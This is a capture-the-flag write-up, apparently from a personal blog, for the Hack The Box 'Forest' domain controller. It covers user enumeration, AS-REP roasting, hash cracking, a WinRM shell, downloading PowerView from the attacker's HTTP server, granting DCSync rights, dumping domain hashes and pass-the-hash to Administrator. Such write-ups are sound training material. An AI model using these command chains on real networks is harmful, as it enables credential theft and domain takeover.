---
Title: Forest HTB
Rating: Easy
OS: Windows
---
# Forest HTB
![Logo](../Images/Forest_HTB/forest_logo.png)

*This writeup is for the Forst Hack the Box Machine*

We'll start by enumerating this box using a quick nmap scan running the default scripts:
```bash
└─$ nmap -sC -sV 10.10.10.161 -v -oN nmap_short.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-25 15:00 AWST
Scanning 10.10.10.161 [1000 ports]
---snip---
Discovered open port 53/tcp on 10.10.10.161
Discovered open port 135/tcp on 10.10.10.161
Discovered open port 139/tcp on 10.10.10.161
Discovered open port 445/tcp on 10.10.10.161
Discovered open port 593/tcp on 10.10.10.161
Discovered open port 636/tcp on 10.10.10.161
Discovered open port 389/tcp on 10.10.10.161
Discovered open port 3269/tcp on 10.10.10.161
Discovered open port 3268/tcp on 10.10.10.161
Discovered open port 88/tcp on 10.10.10.161
Discovered open port 5985/tcp on 10.10.10.161
Discovered open port 464/tcp on 10.10.10.161
---snip---
```

The boave shows varios open ports that are associated with Windows Domain services, indicating that this machine is possibly a domain controller
The domain name lookup script from our nmap commnad enumerated the machine to have the net bios name of FOREST, but the domain name of local.htb:
```bash
Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-01-24T23:07:32-08:00
```

The FQDN for the domain shows the forest.htb.local domain. We'll add these additions to our host file to ensure we can perform accurate enumeration. 
`10.10.10.161    htb.local FOREST.htb.local`

I'll start by enumerating the LDAP services as that seems to be the best starting point.
Running the below ldapsearch command produces a slew of information (and confirms that unauthenticated searches are enabled):
`└─$ ldapsearch -x -H ldap://htb.local -b '' >> ldapsearch.txt`

We can extract the logon usernames out of this search result using:
`└─$ ldapsearch -x -H ldap://htb.local -b "dc=htb,dc=local" -s sub "(&(objectclass=user))" sAMAccountName | grep sAMAccountName: | awk -F': ' '{print $2}' >> usernames.txt`


Next We'll use a tool like Rubeus to see if AS-REP Roasting is possible.

AS-REP Roasting is a methodology to scan for user hashes that have Kerberos pre-authenitcation disabled.  
Kerberos pre-auth is a Windows security mechanism that protects against password-guessing attacks. 
It works by responding to an asynchronous server request with a timestamp enabled with the users password hash.
The Keey Distribution Center then validates this hash by confirming the timestamp.

If Pre-authentication is disabled, then the AS-REQ will be directly responded to with the users password hash.
For more information, see the [LDAP WiKi](https://ldapwiki.com/wiki/Wiki.jsp?page=Kerberos%20Pre-Authentication).

*I ran into a dead end here. I back tracked and looked into RPC, used this route to get a list of users*
We'll use `rpcclient` to enumerate users as it seems there's info missing from what I was able to get out of the LDAP records/
```bash
└─$ rpcclient -U "" -N 10.10.10.161
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```
We'll format these usernames into a usable list and feed it into `GetNPUsers` to find accounts with No Pre-Authentication enabled.
```bash
└─$ impacket-GetNPUsers -no-pass -k -dc-ip 10.10.10.161 'htb.local/' -usersfile usernames.txt 
---snip---
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL...
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
---snip---
```

Now that we have the hash, I'll upload the has into it's own file and run it through hashcat with rockyou.txt:
```bash
└─$ hashcat svc_alfresco.hash /usr/share/wordlists/rockyou.txt --force
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:d41804a8a15406...3bd581
Time.Started.....: Sat Jan 25 17:40:36 2025, (2 secs)
Time.Estimated...: Sat Jan 25 17:40:38 2025, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2327.3 kH/s (4.48ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4096000/14344384 (28.55%)
Rejected.........: 0/4096000 (0.00%)
Restore.Point....: 4079616/14344384 (28.44%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: s9039302b -> s/n/o/o/p/y/
Hardware.Mon.#1..: Temp:100c Util: 69%

Started: Sat Jan 25 17:40:19 2025
Stopped: Sat Jan 25 17:40:39 2025
```
svc-alfresco s3rvice

We'll use these credentials to try get a WinRM session using Evil-Rm
```bash
└─$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice         
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
```
From here we can grab the users flag from the Desktop.

Now that we've got a user logon for the domain, we'll look at escalating this to Administrator level access.
I'll follow [this](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) Red Team Notes article on how to exploit DACLs (Discretionary Access Control Lists) with write access.

The Microsoft article describing DACLs says "If a Windows object does not have a discretionary access control list, the system allows everyone full access to it". DACLs are a mechanism to explicitly revoke or grant access control entries. 

I'll host the `PowerView.ps1` file on my local box using the `python3 -m http.server` command, and then pull it from the FOREST machine using:
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> iwr -uri http://10.10.14.37:8000/PowerView.ps1 -o PowerView.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> import-module ./PowerView.ps1
```

We can use PowerView to scrape users with DACL edits, but I've decided to use BloodHound to get the shortest path.
I spent hours trying to get BloodHound and the Digestor up and running, ultimately I deployed the `SharpHound.exe` to the box using a python http server, and ran it with the following command:
`*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> .\SharpHound.exe --collectionmethods all --domain htb.local --LdapUsername svc-alfresco --LdapPassword s3rvice`

Then I'll download it from the Evil-WinRM session and upload it to my BloodHound database.
![BloodHound_Stats](https://fastly.picsum.photos/id/588/200/300.jpg?hmac=Bb5mvfvSw-sKhocAA4Mfdb78ysl5ktbClTt-Lc0IyWk)

We'll start by marking the user as owned, then we'll find the shortest path from the owned user to High Value Targets
![BloodHound_Path](https://raw.githubusercontent.com/voided323/skills-github-pages/blob/main/_posts/CTFs/Images/Forest_HTB/forest_bloodHound_stats.png)

We'll use the svc-Alfresco to exploit the Write-DACL permissions over the Exchange Windows Permissions group. 
The service account is under the Account Operators group which has write permissions over the Exchange Windows Permissions group.

After reviewing the Windows Abuse information under BloodHound, we'll use the following one-liner to add ourselves to the vulnerable group:
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

We'll review the svc-alfresco user to confirm that they're added to the correct group:
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user svc-alfresco
User name                    svc-alfresco
Full Name                    svc-alfresco
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/25/2025 8:55:14 PM
Password expires             Never
Password changeable          1/26/2025 8:55:14 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/25/2025 8:51:30 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Exchange Windows Perm*Domain Users
                             *Service Accounts
The command completed successfully.
```

Now we'll dump user hashes using `secretsdump`:
```bash
└─$ impacket-secretsdump svc-alfresco:s3rvice@10.10.10.161         
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
```
Now pass the hash through to an Evil-WinRM sesion and grab the root flag:
```bash
└─$ evil-winrm -i 10.10.10.161 -u administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/25/2025   8:33 PM             34 root.txt
```


 


